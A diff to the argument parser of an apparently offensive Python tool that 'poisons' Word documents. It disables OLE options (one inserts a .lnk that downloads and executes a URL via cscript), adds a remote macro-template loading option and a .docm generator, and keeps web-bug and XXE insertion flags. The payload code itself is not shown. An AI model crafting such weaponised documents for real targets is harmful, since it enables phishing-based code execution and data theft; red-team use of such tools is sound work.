@@ -215,17 +215,20 @@ def main():
   newsuffix = '-FINAL'
   
   # Command line options
-  parser = argparse.ArgumentParser(description="Easily poison a Word documents with fun stuff")
+  parser = argparse.ArgumentParser(description="Easily poison Word documents with fun stuff")
   parser.add_argument("-w", "--webbug", metavar="URL", action="append", help="Insert a web bug to this URL (can be http(s)/UNC, can insert multiple into one doc)" )
-  parser.add_argument("-o", "--ole-file", metavar="FILEPATH", help="Insert a file from the filesystem as an OLE object" )
-  parser.add_argument("-l", "--ole-lnk", metavar="URLORPATH", help="Insert a .lnk file as an OLE object to the specified URL / path" )
-  parser.add_argument("-d", "--ole-dlexec", metavar="URL", help="Insert a .lnk file which downloads and executes the specified URL using c:\Windows\System32\cscript" )
+  # parser.add_argument("-o", "--ole-file", metavar="FILEPATH", help="Insert a file from the filesystem as an OLE object" )
+  # parser.add_argument("-l", "--ole-lnk", metavar="URLORPATH", help="Insert a .lnk file as an OLE object to the specified URL / path" )
+  # parser.add_argument("-d", "--ole-dlexec", metavar="URL", help="Insert a .lnk file which downloads and executes the specified URL using c:\Windows\System32\cscript" )
+  # parser.add_argument("-i", "--icon", help="Icon to use when embedding an OLE object", choices=['word','excel'], default='word' )
+  # parser.add_argument("-c", "--caption", help="Caption to write next to file icon (i.e. the file name)", default='Attachment.docx' )
   parser.add_argument("-r", "--replace", action="store_true", help="Replace a file in place instead of creating a new one and appending '"+newsuffix+".docx' to the file name" )
   parser.add_argument("-s", "--suffix", help="Suffix to use instead of '"+newsuffix+"' (extension is always preserved)" )
-  parser.add_argument("-i", "--icon", help="Icon to use when embedding an OLE object", choices=['word','excel'], default='word' )
-  parser.add_argument("-c", "--caption", help="Caption to write next to file icon (i.e. the file name)", default='Attachment.docx' )
-  parser.add_argument("--sanitise", action="store_true", help="Strip identifiable information (author, last modified) from document" )
+  parser.add_argument("--sanitise", action="store_true", help="Strip identifiable information (author, last modified by, company) from document" )
   parser.add_argument("-x", "--xxe", help="Insert XXE SYSTEM element into the document which fetches this path/URL and displays it inline. WARNING - will break Word parsing - use only against automated parsers" )
+  # http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html
+  parser.add_argument("-m", "--macro", help="Make this remote macro enabled document load when the docx is opened" )
+  parser.add_argument("--docm", metavar="MACROTXT", help="Generate a .docm file containing this macro" )
 
   # TODO
   # parser.add_argument("-t", "--template", help="Insert the URL of a template to download as the document opens (e.g. UNC path)" )
@@ -249,15 +252,6 @@ def main():
       for bug in args.webbug:
         doc.insert_webbug( bug )
 
-    if args.ole_lnk:
-      doc.insert_olelnk( args.ole_lnk, args.icon, args.caption )
-    
-    if args.ole_file:
-      doc.insert_olefile( args.ole_file, args.icon, args.caption )
-
-    if args.ole_dlexec:
-      doc.insert_ole_dlexec_lnk( args.ole_dlexec, args.icon, args.caption )
-  
     if args.sanitise:
       doc.sanitise()
   
